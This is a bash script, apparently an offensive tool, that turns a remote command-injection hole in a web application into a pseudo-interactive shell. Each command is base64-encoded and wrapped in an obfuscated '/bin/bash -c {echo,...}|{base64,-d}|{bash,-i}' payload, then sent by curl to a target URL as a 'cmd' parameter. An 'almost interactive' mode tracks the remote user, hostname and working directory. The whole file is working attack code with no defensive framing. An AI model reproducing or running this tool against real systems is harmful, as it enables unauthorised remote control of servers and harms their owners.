usage()
{
  echo -ne \
    "First, edit the function send_payload.\n" \
    "usage: $0 -u TARGET_URL [-i | --interactive]\n"   \
    "\techo test\n" \
    "\ttest\n"      \
    "\texit\n"      \
    "\tBye\n"
}

encode_command()
{
  echo $1 | base64 -w 0
}

# Edit this payload
build_payload()
{
  echo "/bin/bash -c \"{echo,$1}|{base64,-d}|{bash,-i}\""
}

# Edit this request
send_payload()
{
  raw=$(curl -s "$url" -G --data-urlencode "cmd=$1")
  echo "$raw" # Return the command output
}

execute_command()
{
  cmd=$1
  encoded_cmd=$(encode_command "$cmd")
  payload=$(build_payload "$encoded_cmd")
  response=$(send_payload "$payload")
  echo "$response"
}

better_shell()
{
  while :; do
    read -e command
    if [ "$command" == "exit" ]; then 
      break
    fi
    result=$(execute_command "$command")
    echo -e "$result" >&2
  done
}

almost_interactive_shell()
{
  history -c
  user=$(execute_command "whoami")
  hostname=$(execute_command "hostname")
  path=$(execute_command "pwd")
  while :; do
    read -ep "$user@$hostname:$path$ " command
    if [ "$command" == "exit" ]; then 
      break
    fi
    history -s "$command"
    result=$(execute_command "cd $path; $command 2>&1; pwd")
    command_output=$(echo -ne "$result" | head -n -1)
    if [[ -n "$command_output" ]]; then 
      echo -e "$command_output" >&2
    fi
    path=$(echo -ne "$result" | tail -n 1)
  done
}

if [[ $# -eq 0 ]]; then
  usage
  exit 0
fi

interactive=0
while [ "$1" != "" ]; do
 case $1 in 
   -i | --interactive ) interactive=1
                        ;;
   -u | --url )   shift
                  url=$1
                  ;;
   -h | --help )  usage
                  exit
                  ;;
   * )            usage
                  exit 1
 esac
 shift
done

if [[ $interactive == 1 ]]; then
  almost_interactive_shell
else 
  better_shell
fi

echo "Bye"

